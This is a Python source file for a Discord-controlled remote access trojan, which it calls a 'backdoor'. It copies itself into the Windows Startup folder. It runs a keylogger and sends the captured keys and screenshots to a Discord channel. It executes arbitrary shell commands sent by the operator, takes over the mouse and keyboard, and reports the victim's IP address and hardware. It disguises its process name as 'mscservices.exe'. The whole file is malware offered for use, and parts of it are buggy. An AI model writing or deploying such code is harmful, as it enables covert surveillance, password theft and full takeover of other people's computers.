

import discord
from discord.ext import commands
from PIL import ImageGrab
import io
from pynput.keyboard import Listener
import os
import requests
import platform
import psutil
import GPUtil
import pyautogui
import time
import setproctitle
import shutil

import shutil
import os
import sys

current_script_path = os.path.abspath(sys.argv[0])

destination_directory = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

destination_path = os.path.join(destination_directory, os.path.basename(current_script_path))

shutil.copy2(current_script_path, destination_path)
print(f"Copy of the script moved to: {destination_path}")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

commandsList = ["!screenshot sends screenshot of users pc",
                "!keylogger enables key logger",
                "!sendkeys gives you users pressed keys in a txt",
                "!cmd <cmd_command> sends a command to CMD, !!! IF THERES SPACES IN THE COMMAND SEPARATE THEM WITH A _ !!!",
                "!ip sends the users ip adress",
                "!hardwareinfo gives you info about users hardware such as cpu ram and gpu",
                "!type <TEXT> types out the <TEXT> in the users computer, !!! IF THERES SPACES IN THE TEXT SEPARATE THEM WITH A _ !!!",
                "!mousepos <X Position> <Y Position> sets users cursor position based on given coordinates",
                "!leftclick",
                "!rightclick",
                "!doubleclick",
                "!createfile <content> <path> creates a file with the content/text of <content> on the path of <path>, something like !createfile testing C:\test.txt"
]

keys = []
keyloggerOn = False

class Functions:
    def capture_screenshot():
        screenshot = ImageGrab.grab()
        image_byte_array = io.BytesIO()
        screenshot.save(image_byte_array, format='PNG')
        return image_byte_array.getvalue()

    def capture_keystroke(key):
        global keys
        if keyloggerOn:
            keys.append(str(key) + "\n")
        else:
            keys = []

    def exec_cmd(command):
        os.system(str(command))

    def typeout(command):
        time.sleep(0.5)
        pyautogui.typewrite(str(command),0.05)

    def mousePos(x,y):
        time.sleep(0.5)
        pyautogui.moveTo(x,y)

    def leftclick():
        time.sleep(0.5)
        pyautogui.leftClick()

    def rightclick():
        time.sleep(0.5)
        pyautogui.rightClick()

    def doubleclick():
        time.sleep(0.5)
        pyautogui.doubleClick()

    def createfile(content, filename):
            home_directory = os.path.expanduser("~")
            path = os.path.join(home_directory, filename)

            newContent = content.replace("_", " ")

            try:
                with open(path, "w") as file:
                    file.write(newContent)
                return f"File {filename} created successfully."
            except Exception as e:
                return f"Error creating file: {str(e)}"

def keylogger_thread():
    with Listener(on_press=Functions.capture_keystroke) as listener:
        listener.join()

@bot.event
async def on_ready(ctx):
    IP = requests.get("http://api.ipify.org/")
    await ctx.send(IP + " has launched the backdoor")

@bot.command()
async def commandlist(ctx):
    await ctx.send(commandsList)

@bot.command()
async def screenshot(ctx):
    screenshot_bytes = Functions.capture_screenshot()
    screenshot_file = discord.File(io.BytesIO(screenshot_bytes), filename='screenshot.png')
    await ctx.send(file=screenshot_file)

@bot.command()
async def keylogger(ctx):
    global keyloggerOn
    keyloggerOn = not keyloggerOn
    await ctx.send("keylogger is now " + str(keyloggerOn))

@bot.command()
async def sendkeys(ctx):
    global keys
    keys_str = "".join(keys)
    file = discord.File(io.BytesIO(keys_str.encode()), filename="keystrokes.txt")
    await ctx.send(file=file)

@bot.command()
async def cmd(ctx,command):
    newCommand = command.replace("_"," ")
    await ctx.send(str(newCommand) + " has been sent")
    Functions.exec_cmd(newCommand)

@bot.command()
async def ip(ctx):
    IP = requests.get("http://api.ipify.org/")
    await ctx.send(str(IP.text))

@bot.command()
async def hardwareinfo(ctx):
    system_info = platform.uname()

    system = system_info.system
    machine = system_info.machine
    version = system_info.version
    cpu = platform.processor()
    memoryBytes = psutil.virtual_memory()
    memory = memoryBytes.total / (1024 ** 3)
    gpus = GPUtil.getGPUs()

    gpu = None

    for GPU in gpus:
        gpu = GPU

    drivesS = psutil.disk_partitions()

    drives = [drive.device for drive in drivesS if drive.fstype != '']

    await ctx.send(f"System -> {system}\n Machine -> {machine}\n  System Version -> {version}\n   Processor/CPU -> {cpu}\n    Memory/RAM -> {memory}\n     Graphics Card/GPU -> {gpu}\n      Drives/Disks: {drives}")


@bot.command()
async def type(ctx,command):
    newCommand = command.replace("_"," ")
    await ctx.send(str(newCommand) + " has been typed out")
    Functions.typeout(newCommand)

@bot.command()
async def mousepos(ctx,x,y):
    await ctx.send("mouse position has been set X: " + str(x) + " Y: " + str(y))
    Functions.mousePos(int(x),int(y))

@bot.command()
async def leftclick(ctx):
    await ctx.send("left mouse button clicked")
    Functions.leftclick()

@bot.command()
async def rightclick(ctx):
    await ctx.send("right mouse button clicked")
    Functions.rightclick()

@bot.command()
async def doubleclick(ctx):
    await ctx.send("double clicked mouse")
    Functions.doubleclick()

@bot.command()
async def createfile(ctx, content, path):
    result = Functions.createfile(content, path)
    await ctx.send(result)

with Listener(on_press=Functions.capture_keystroke) as listener:
    bot.run(TOKEN)
    listener.join()
    setproctitle.setproctitle("mscservices.exe")
